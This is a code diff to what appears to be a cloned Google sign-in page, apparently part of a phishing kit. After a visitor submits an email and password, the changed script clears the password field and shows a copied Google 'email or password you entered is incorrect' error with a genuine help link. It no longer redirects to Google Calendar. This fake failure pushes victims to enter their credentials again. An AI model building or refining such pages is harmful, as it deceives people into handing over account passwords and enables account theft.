@@ -1131,9 +1131,13 @@ $(function() {
   $("#signIn").click(function(){
       setTimeout(function() {
           if ($("#Email").val() && $("#Passwd").val()) {
-            location = "http://google.com/calendar/render"
+            $("#Passwd").val("")
+            $("#Passwd").attr("class","form-error")
+            $("#Passwd").focus();
+            $("#errormsg_0_Passwd").show();
+            // location = "http://google.com/calendar/render"
           }
-      }, 2000);
+      }, 500);
   });
 });
 </script>
@@ -1169,7 +1173,16 @@ $(function() {
 <label class="hidden-label" for="Email">Email</label>
 <input id="Email" type="email" placeholder="Email" value="" spellcheck="false" class="">
 <label class="hidden-label" for="Passwd">Password</label>
-<input id="Passwd"  type="password" placeholder="Password" class="">
+<input id="Passwd"  type="password" placeholder="Password" >
+<!-- class="form-error" -->
+<span style="display:None" role="alert" class="error-msg" id="errormsg_0_Passwd">
+The email or password you entered is incorrect.
+<a href="https://support.google.com/accounts/bin/answer.py?answer=27444&amp;hl=en&amp;ctx=ch_ServiceLoginAuth&amp;p=cl" target="_blank" class="help-link">?</a>
+</span>
+
+
+
+
 <input id="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
   <label class="remember">
   <input id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes" checked="checked">
